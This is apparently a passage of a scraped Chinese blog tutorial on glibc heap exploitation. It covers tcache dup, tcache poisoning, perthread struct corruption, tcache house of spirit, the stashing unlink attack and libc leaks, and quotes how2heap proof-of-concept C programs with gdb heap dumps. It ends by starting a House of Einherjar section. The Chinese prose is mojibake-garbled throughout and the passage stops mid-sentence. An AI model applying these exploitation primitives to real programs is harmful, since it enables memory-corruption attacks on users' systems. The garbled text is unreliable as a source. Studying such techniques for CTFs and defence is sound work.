(0x7fff0d28a0c8).1st malloc(128): 0x55f666ee1260Now the tcache list has [ 0x7fff0d28a0c8 ].2st malloc(128): 0x7fff0d28a0c8We got the control ä»ä»£ç çš„é€»è¾‘å¯ä»¥çœ‹å‡ºå…¶æ¼æ´åˆ©ç”¨ä¸ fastbin çš„æ”»å‡»æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯é€šè¿‡æ›´æ”¹fdæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„åœ°å€ï¼Œä½†å› ä¸ºæ²¡æœ‰ size çš„é™åˆ¶æœ‰äº†æ›´å¤§çš„åˆ©ç”¨èŒƒå›´ã€‚ tcache dupç±»ä¼¼ fastbin dupï¼Œä¸è¿‡åˆ©ç”¨çš„æ˜¯ tcache_put() çš„ä¸ä¸¥è°¨ï¼š static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){ tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);} å¯ä»¥çœ‹å‡ºï¼Œtcache_put() çš„æ£€æŸ¥ä¹Ÿå¯ä»¥å¿½ç•¥ä¸è®¡ï¼ˆç”šè‡³æ²¡æœ‰å¯¹ tcache-&gt;counts[tc_idx] çš„æ£€æŸ¥ï¼‰ï¼Œå¤§å¹…æé«˜æ€§èƒ½çš„åŒæ—¶å®‰å…¨æ€§ä¹Ÿä¸‹é™äº†å¾ˆå¤šã€‚ å› ä¸ºæ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹åŒä¸€ä¸ª chunk å¤šæ¬¡ freeï¼Œé€ æˆ cycliced listã€‚ ä»¥ how2heap ä¸­çš„ tcache_dup ä¸ºä¾‹ï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates a simple double-free attack with tcache.\\n\"); fprintf(stderr, \"Allocating buffer.\\n\"); int *a = malloc(8); fprintf(stderr, \"malloc(8): %p\\n\", a); fprintf(stderr, \"Freeing twice...\\n\"); free(a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p ].\\n\", a, a); fprintf(stderr, \"Next allocated buffers will be same: [ %p, %p ].\\n\", malloc(8), malloc(8)); return 0;} ç¬¬ä¸€æ¬¡ free æ—¶ï¼Œç”³è¯·çš„ chunk è¢«æ”¾å…¥ tcache_entry ä¸­ï¼š pwndbg&gt; heapinfo3886144(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555756270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x20) tcache_entry[0]: 0x555555756260 ç¬¬äºŒæ¬¡ free æ—¶ï¼Œè™½ç„¶ free çš„æ˜¯åŒä¸€ä¸ª chunkï¼Œä½†å› ä¸º tcache_put() æ²¡æœ‰åšä»»ä½•æ£€æŸ¥ï¼Œå› æ­¤ç¨‹åºä¸ä¼š crashï¼Œè€Œ tcache_entry ä¸­ä¼šå†æ·»åŠ è¯¥ chunk çš„åœ°å€ï¼š pwndbg&gt; heapinfo3886144(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555756270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x20) tcache_entry[0]: 0x555555756260 --&gt; 0x555555756260 (overlap chunk with 0x555555756250(freed) ) tcache perthread corruptionæˆ‘ä»¬å·²ç»çŸ¥é“ tcache_perthread_struct æ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œå¦‚æœèƒ½æ§åˆ¶è¿™ä¸ªç»“æ„ä½“ï¼Œé‚£ä¹ˆæ— è®ºæˆ‘ä»¬ malloc çš„ size æ˜¯å¤šå°‘ï¼Œåœ°å€éƒ½æ˜¯å¯æ§çš„ã€‚ è®¾æƒ³æœ‰å¦‚ä¸‹çš„å †æ’å¸ƒæƒ…å†µï¼š tcache_ +------------+\\perthread |...... |\\_struct +------------+ |counts[i] | +------------+ |...... | +----------+ +------------+ |header | |entries[i] |---------&gt;+----------+ +------------+ |NULL | |...... | +----------+ | | | | +------------+ +----------+ é€šè¿‡ä¸€äº›æ‰‹æ®µï¼ˆå¦‚ tcache posioningï¼‰ï¼Œæˆ‘ä»¬å°†å…¶æ”¹ä¸ºäº†ï¼š tcache_ +------------+&lt;---------------------------+\\perthread |...... | |\\_struct +------------+ | |counts[i] | | +------------+ | |...... | +----------+ | +------------+ |header | | |entries[i] |---------&gt;+----------+ | +------------+ |target |------+ |...... | +----------+ | | | | +------------+ +----------+ è¿™æ ·ï¼Œä¸¤æ¬¡ malloc åæˆ‘ä»¬å°±è¿”å›äº† tcache_prethread_struct çš„åœ°å€ï¼Œå°±å¯ä»¥æ§åˆ¶æ•´ä¸ª tcache äº†ã€‚å› ä¸º tcache_prethread_struct ä¹Ÿåœ¨å †ä¸Šï¼Œå› æ­¤è¿™ç§æ–¹æ³•ä¸€èˆ¬åªéœ€è¦ partial overwrite å°±å¯ä»¥è¾¾åˆ°ç›®çš„ã€‚ tcache house of spiritä¸ fastbin ä¸­çš„ house of spirit ä¸€æ ·ï¼Œè¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºåœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚ æ‹¿ how2heap çš„æºç æ¥è®²ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates the house of spirit attack on tcache.\\n\"); fprintf(stderr, \"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\\n\"); fprintf(stderr, \"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\\n\"); fprintf(stderr, \"(Search for strings \\\"invalid next size\\\" and \\\"double free or corruption\\\")\\n\\n\"); fprintf(stderr, \"Ok. Let's start with the example!.\\n\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\\n\"); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr, \"This region contains one fake chunk. It's size field is placed at %p\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));} æ”»å‡»ä¹‹åçš„ç›®çš„æ˜¯ï¼Œå»æ§åˆ¶æ ˆä¸Šçš„å†…å®¹ï¼Œmalloc ä¸€å— chunk ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡åœ¨æ ˆä¸Š fake çš„ chunkï¼Œç„¶åå» free æ‰ä»–ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼š gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x4052e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x90) tcache_entry[7]: 0x7fffffffe510 --&gt; 0x401340 Tcache é‡Œå°±å­˜æ”¾äº†ä¸€å— æ ˆä¸Šçš„å†…å®¹ï¼Œæˆ‘ä»¬ä¹‹ååªéœ€ mallocï¼Œå°±å¯ä»¥æ§åˆ¶è¿™å—å†…å­˜ã€‚ smallbin unlinkåœ¨ smallbin ä¸­åŒ…å«æœ‰ç©ºé—²å—çš„æ—¶å€™ï¼Œä¼šåŒæ—¶å°†åŒå¤§å°çš„å…¶ä»–ç©ºé—²å—ï¼Œæ”¾å…¥ tcache ä¸­ï¼Œæ­¤æ—¶ä¹Ÿä¼šå‡ºç°è§£é“¾æ“ä½œï¼Œä½†ç›¸æ¯”äº unlink å®ï¼Œç¼ºå°‘äº†é“¾å®Œæ•´æ€§æ ¡éªŒã€‚å› æ­¤ï¼ŒåŸæœ¬ unlink æ“ä½œåœ¨è¯¥æ¡ä»¶ä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚ tcache stashing unlink attackè¿™ç§æ”»å‡»åˆ©ç”¨çš„æ˜¯ tcache bin æœ‰å‰©ä½™ (æ•°é‡å°äº TCACHE_MAX_BINS ) æ—¶ï¼ŒåŒå¤§å°çš„ small bin ä¼šæ”¾è¿› tcache ä¸­ (è¿™ç§æƒ…å†µå¯ä»¥ç”¨ calloc åˆ†é…åŒå¤§å°å †å—è§¦å‘ï¼Œå› ä¸º calloc åˆ†é…å †å—æ—¶ä¸ä» tcache bin ä¸­é€‰å–)ã€‚åœ¨è·å–åˆ°ä¸€ä¸ª smallbin ä¸­çš„ä¸€ä¸ª chunk åä¼šå¦‚æœ tcache ä»æœ‰è¶³å¤Ÿç©ºé—²ä½ç½®ï¼Œä¼šå°†å‰©ä½™çš„ small bin é“¾å…¥ tcache ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åªå¯¹ç¬¬ä¸€ä¸ª bin è¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåé¢çš„å †å—çš„æ£€æŸ¥ç¼ºå¤±ã€‚å½“æ”»å‡»è€…å¯ä»¥å†™ä¸€ä¸ª small bin çš„ bk æŒ‡é’ˆæ—¶ï¼Œå…¶å¯ä»¥åœ¨ä»»æ„åœ°å€ä¸Šå†™ä¸€ä¸ª libc åœ°å€ (ç±»ä¼¼ unsorted bin attack çš„æ•ˆæœ)ã€‚æ„é€ å¾—å½“çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥åˆ†é… fake chunk åˆ°ä»»æ„åœ°å€ã€‚ æˆ‘ä»¬æŒ‰ç…§é‡Šæ”¾çš„å…ˆåé¡ºåºç§° smallbin[sz] ä¸­çš„ä¸¤ä¸ª chunk åˆ†åˆ«ä¸º chunk0 å’Œ chunk1ã€‚æˆ‘ä»¬ä¿®æ”¹ chunk1 çš„ bk ä¸º fake_chunk_addrã€‚åŒæ—¶è¿˜è¦åœ¨ fake_chunk_addr-&gt;bk å¤„æå‰å†™ä¸€ä¸ªå¯å†™åœ°å€ writable_addr ã€‚è°ƒç”¨ calloc(size-0x10) çš„æ—¶å€™ä¼šè¿”å›ç»™ç”¨æˆ· chunk0 (è¿™æ˜¯å› ä¸º smallbin çš„ FIFO åˆ†é…æœºåˆ¶)ï¼Œå‡è®¾ tcache[sz] ä¸­æœ‰ 5 ä¸ªç©ºé—²å †å—ï¼Œåˆ™æœ‰è¶³å¤Ÿçš„ä½ç½®å®¹çº³ chunk1 ä»¥åŠ fake_chunk ã€‚åœ¨æºç çš„æ£€æŸ¥ä¸­ï¼Œåªå¯¹ç¬¬ä¸€ä¸ª chunk çš„é“¾è¡¨å®Œæ•´æ€§åšäº†æ£€æµ‹ __glibc_unlikely (bck-&gt;fd != victim) ï¼Œåç»­å †å—åœ¨æ”¾å…¥è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æ£€æµ‹ã€‚ å› ä¸º tcache çš„åˆ†é…æœºåˆ¶æ˜¯ LIFO ï¼Œæ‰€ä»¥ä½äº fake_chunk-&gt;bk æŒ‡é’ˆå¤„çš„ fake_chunk åœ¨é“¾å…¥ tcache çš„æ—¶å€™åè€Œä¼šæ”¾åˆ°é“¾è¡¨è¡¨å¤´ã€‚åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨ malloc(sz-0x10) æ—¶ä¼šè¿”å› fake_chunk+0x10 ç»™ç”¨æˆ·ï¼ŒåŒæ—¶ï¼Œç”±äº bin-&gt;bk = bck;bck-&gt;fd = bin; çš„ unlink æ“ä½œï¼Œä¼šä½¿å¾— writable_addr+0x10 å¤„è¢«å†™å…¥ä¸€ä¸ª libc åœ°å€ã€‚ è¿™é‡Œä»¥ how2heap ä¸­çš„ tcache_stashing_unlink_attack ä¸ºä¾‹ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ unsigned long stack_var[0x10] = {0}; unsigned long *chunk_lis[0x10] = {0}; unsigned long *target; fprintf(stderr, \"This file demonstrates the stashing unlink attack on tcache.\\n\\n\"); fprintf(stderr, \"This poc has been tested on both glibc 2.27 and glibc 2.29.\\n\\n\"); fprintf(stderr, \"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n\"); fprintf(stderr, \"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n\"); fprintf(stderr, \"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\\n\\n\"); // stack_var emulate the fake_chunk we want to alloc to fprintf(stderr, \"Stack_var emulates the fake chunk we want to alloc to.\\n\\n\"); fprintf(stderr, \"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n\"); stack_var[3] = (unsigned long)(&amp;stack_var[2]); fprintf(stderr, \"You can see the value of fake_chunk-&gt;bk is:%p\\n\\n\",(void*)stack_var[3]); fprintf(stderr, \"Also, let's see the initial value of stack_var[4]:%p\\n\\n\",(void*)stack_var[4]); fprintf(stderr, \"Now we alloc 9 chunks with malloc.\\n\\n\"); //now we malloc 9 chunks for(int i = 0;i &lt; 9;i++){ chunk_lis[i] = (unsigned long*)malloc(0x90); } //put 7 tcache fprintf(stderr, \"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n\"); for(int i = 3;i &lt; 9;i++){ free(chunk_lis[i]); } fprintf(stderr, \"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n\"); //last tcache bin free(chunk_lis[1]); //now they are put into unsorted bin free(chunk_lis[0]); free(chunk_lis[2]); //convert into small bin fprintf(stderr, \"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n\"); malloc(0xa0);//&gt;0x90 //now 5 tcache bins fprintf(stderr, \"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n\"); malloc(0x90); malloc(0x90); fprintf(stderr, \"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n\",(void*)stack_var); //change victim-&gt;bck /*VULNERABILITY*/ chunk_lis[2][1] = (unsigned long)stack_var; /*VULNERABILITY*/ //trigger the attack fprintf(stderr, \"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n\"); calloc(1,0x90); fprintf(stderr, \"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n\",(void*)stack_var[2],(void*)stack_var[4]); //malloc and return our fake chunk on stack target = malloc(0x90); fprintf(stderr, \"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\",(void*)target); return 0;} è¿™ä¸ª poc ç”¨æ ˆä¸Šçš„ä¸€ä¸ªæ•°ç»„ä¸Šæ¨¡æ‹Ÿ fake_chunk ã€‚é¦–å…ˆæ„é€ å‡º 5 ä¸ª tcache chunk å’Œ 2 ä¸ª smallbin chunk çš„æƒ…å†µã€‚æ¨¡æ‹Ÿ UAF æ¼æ´ä¿®æ”¹ bin2-&gt;bk ä¸º fake_chunk ï¼Œåœ¨ calloc(0x90) çš„æ—¶å€™è§¦å‘æ”»å‡»ã€‚ æˆ‘ä»¬åœ¨ calloc å¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒç”¨å‰æŸ¥çœ‹å †å—æ’å¸ƒæƒ…å†µã€‚æ­¤æ—¶ tcache[0xa0] ä¸­æœ‰ 5 ä¸ªç©ºé—²å—ã€‚å¯ä»¥çœ‹åˆ° chunk1-&gt;bk å·²ç»è¢«æ”¹ä¸ºäº† fake_chunk_addr ã€‚è€Œ fake_chunk-&gt;bk ä¹Ÿå†™ä¸Šäº†ä¸€ä¸ªå¯å†™åœ°å€ã€‚ç”±äº smallbin æ˜¯æŒ‰ç…§ bk æŒ‡é’ˆå¯»å—çš„ï¼Œåˆ†é…å¾—åˆ°çš„é¡ºåºåº”å½“æ˜¯ 0x0000000000603250-&gt;0x0000000000603390-&gt;0x00007fffffffdbc0 (FIFO) ã€‚è°ƒç”¨ calloc ä¼šè¿”å›ç»™ç”¨æˆ· 0x0000000000603250+0x10ã€‚ gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6038a0 (size : 0x20760) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x0a0) smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)(0xa0) tcache_entry[8](5): 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440gdb-peda$ x/4gx 0x6033900x603390: 0x0000000000000000 0x00000000000000a10x6033a0: 0x0000000000603250 0x00007fffffffdbc0gdb-peda$ x/4gx 0x00007fffffffdbc00x7fffffffdbc0: 0x0000000000000000 0x00000000000000000x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbd0gdb-peda$ x/4gx 0x00000000006032500x603250: 0x0000000000000000 0x00000000000000a10x603260: 0x00007ffff7dcfd30 0x0000000000603390gdb-peda$ x/4gx 0x00007ffff7dcfd300x7ffff7dcfd30 &lt;main_arena+240&gt;: 0x00007ffff7dcfd20 0x00007ffff7dcfd200x7ffff7dcfd40 &lt;main_arena+256&gt;: 0x0000000000603390 0x0000000000603250 è°ƒç”¨ calloc åå†æŸ¥çœ‹å †å—æ’å¸ƒæƒ…å†µï¼Œå¯ä»¥çœ‹åˆ° fake_chunk å·²ç»è¢«é“¾å…¥ tcache_entry[8] , ä¸”å› ä¸ºåˆ†é…é¡ºåºå˜æˆäº† LIFO , 0x7fffffffdbd0-0x10 è¿™ä¸ªå—è¢«æåˆ°äº†é“¾è¡¨å¤´ï¼Œä¸‹æ¬¡ malloc(0x90) å³å¯è·å¾—è¿™ä¸ªå—ã€‚ å…¶ fd æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å—ï¼Œåœ¨ unlink è¿‡ç¨‹ä¸­ bck-&gt;fd=bin çš„èµ‹å€¼æ“ä½œä½¿å¾— 0x00007fffffffdbd0+0x10 å¤„å†™å…¥äº†ä¸€ä¸ª libc åœ°å€ã€‚ gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6038a0 (size : 0x20760) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x0a0) smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)(0xa0) tcache_entry[8](7): 0x7fffffffdbd0 --&gt; 0x6033a0 --&gt; 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440gdb-peda$ x/4gx 0x7fffffffdbd00x7fffffffdbd0: 0x00000000006033a0 0x00007fffffffdbd00x7fffffffdbe0: 0x00007ffff7dcfd30 0x0000000000000000 libc leakåœ¨ä»¥å‰çš„ libc ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¿™æ ·ï¼š #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(){ long *a = malloc(0x1000); malloc(0x10); free(a); printf(\"%p\\n\",a[0]);} ä½†æ˜¯åœ¨ 2.26 ä¹‹åçš„ libc ç‰ˆæœ¬åï¼Œæˆ‘ä»¬é¦–å…ˆå¾—å…ˆæŠŠ tcache å¡«æ»¡ï¼š #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc , char* argv[]){ long* t[7]; long *a=malloc(0x100); long *b=malloc(0x10); // make tcache bin full for(int i=0;i&lt;7;i++) t[i]=malloc(0x100); for(int i=0;i&lt;7;i++) free(t[i]); free(a); // a is put in an unsorted bin because the tcache bin of this size is full printf(\"%p\\n\",a[0]);} ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ leak libc äº†ã€‚å¦‚ä¸‹å›¾ï¼š gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555559af0 (size : 0x20510) last_remainder: 0x0 (size : 0x0) unsortbin: 0x555555559250 (size : 0x110)(0x110) tcache_entry[15]: 0x5555555599f0 --&gt; 0x5555555598e0 --&gt; 0x5555555597d0 --&gt; 0x5555555596c0 --&gt; 0x5555555595b0 --&gt; 0x5555555594a0 --&gt; 0x555555559390gdb-peda$ parseheapaddr prev size status fd bk0x555555559000 0x0 0x250 Used None None0x555555559250 0x0 0x110 Freed 0x7ffff7fc0ca0 0x7ffff7fc0ca00x555555559360 0x110 0x20 Used None None0x555555559380 0x0 0x110 Used None None0x555555559490 0x0 0x110 Used None None0x5555555595a0 0x0 0x110 Used None None0x5555555596b0 0x0 0x110 Used None None å»ºè®®çš„ç»ƒä¹ é¢˜ 2018 HITCON children_tcache 2018 BCTF houseOfAtum 2019 HTICON Lazy House 2020 XCTF no-Cov twochunk","link":"/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/"},{"title":"å †æº¢å‡º-Housese_Of_XXX","text":"House Of XXX æ˜¯ 2004 å¹´ã€ŠThe Malloc Maleficarum-Glibc Malloc Exploitation Techniquesã€‹ä¸­æå‡ºçš„ä¸€ç³»åˆ—é’ˆå¯¹ glibc å †åˆ†é…å™¨çš„åˆ©ç”¨æ–¹æ³•ã€‚ ç”±äºå¹´ä»£ä¹…è¿œã€ŠThe Malloc Maleficarumã€‹ä¸­æå‡ºçš„å¤§å¤šæ•°æ–¹æ³•ä»Šå¤©éƒ½ä¸èƒ½å¥æ•ˆï¼Œæˆ‘ä»¬ç°åœ¨æ‰€æŒ‡çš„ House Of XXX åˆ©ç”¨ç›¸æ¯” 2004 å¹´æ–‡ç« ä¸­å†™çš„å·²æœ‰è¾ƒå¤§çš„ä¸åŒã€‚ ä½†æ˜¯ã€ŠThe Malloc Maleficarumã€‹ä¾ç„¶æ˜¯ä¸€ç¯‡æ¨èé˜…è¯»çš„æ–‡ç« ï¼Œå¯ä»¥åœ¨è¿™é‡Œè¯»åˆ°å®ƒçš„åŸæ–‡ï¼š https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt House Of Einherjarhouse of einherjar æ˜¯ä¸€ç§å †åˆ©ç”¨æŠ€æœ¯ï¼Œç”± Hiroki Matsukuma æå‡ºã€‚è¯¥å †åˆ©ç”¨æŠ€æœ¯å¯ä»¥å¼ºåˆ¶ä½¿å¾— malloc è¿”å›ä¸€ä¸ªå‡ ä¹ä»»æ„åœ°å€çš„ chunk ã€‚å…¶ä¸»è¦åœ¨äºæ»¥ç”¨ free ä¸­çš„åå‘åˆå¹¶æ“ä½œï¼ˆåˆå¹¶ä½åœ°å€çš„ chunkï¼‰ï¼Œä»è€Œä½¿å¾—å°½å¯èƒ½é¿å…ç¢ç‰‡åŒ–ã€‚ æ­¤å¤–ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šå¤§å°çš„å †å—ä¸­ï¼Œoff by one ä¸ä»…å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„ prev_sizeï¼Œè¿˜å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„ PREV_INUSE æ¯”ç‰¹ä½ã€‚ æ¼æ´åŸç†åå‘åˆå¹¶æ“ä½œfree å‡½æ•°ä¸­çš„åå‘åˆå¹¶æ ¸å¿ƒæ“ä½œå¦‚ä¸‹ï¼š /* consolidate backward */if (!prev_inuse(p)) { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);} å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š åˆ©ç”¨åŸç†é¦–å…ˆï¼Œåœ¨ä¹‹å‰çš„å †çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä»¥ä¸‹çš„çŸ¥è¯†ï¼š ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ chunk ä¼šå…±äº« prev_sizeå­—æ®µï¼Œå°¤å…¶æ˜¯å½“ä½åœ°å€çš„ chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œé«˜åœ°å€çš„ chunk çš„è¯¥å­—æ®µä¾¿å¯ä»¥è¢«ä½åœ°å€çš„ chunk ä½¿ç”¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¸Œæœ›å¯ä»¥é€šè¿‡å†™ä½åœ°å€ chunk è¦†ç›–é«˜åœ°å€ chunk çš„ prev_size å­—æ®µã€‚ ä¸€ä¸ª chunk PREV_INUSE ä½æ ‡è®°äº†å…¶ç‰©ç†ç›¸é‚»çš„ä½åœ°å€ chunk çš„ä½¿ç”¨çŠ¶æ€ï¼Œè€Œä¸”è¯¥ä½æ˜¯å’Œ prev_size ç‰©ç†ç›¸é‚»çš„ã€‚ åå‘åˆå¹¶æ—¶ï¼Œæ–°çš„ chunk çš„ä½ç½®å–å†³äº chunk_at_offset(p, -((long) prevsize)) ã€‚ é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥åŒæ—¶æ§åˆ¶ä¸€ä¸ª chunk prev_size ä¸ PREV_INUSE å­—æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†æ–°çš„ chunk æŒ‡å‘å‡ ä¹ä»»ä½•ä½ç½®ã€‚ åˆ©ç”¨è¿‡ç¨‹æº¢å‡ºå‰ï¼šå‡è®¾æº¢å‡ºå‰çš„çŠ¶æ€å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æº¢å‡ºï¼šè¿™é‡Œæˆ‘ä»¬å‡è®¾p0å †å—ä¸€æ–¹é¢å¯ä»¥å†™prev_sizeå­—æ®µï¼Œå¦ä¸€æ–¹é¢ï¼Œå­˜åœ¨off by oneçš„æ¼æ´ï¼Œå¯ä»¥å†™ä¸‹ä¸€ä¸ª chunk çš„PREV_INUSEéƒ¨åˆ†ï¼Œé‚£ä¹ˆï¼š æº¢å‡ºåï¼šå‡è®¾æˆ‘ä»¬å°†p1çš„ prev_size å­—æ®µè®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¦çš„ç›®çš„ chunk ä½ç½®ä¸ p1 çš„å·®å€¼ã€‚åœ¨æº¢å‡ºåï¼Œæˆ‘ä»¬é‡Šæ”¾ 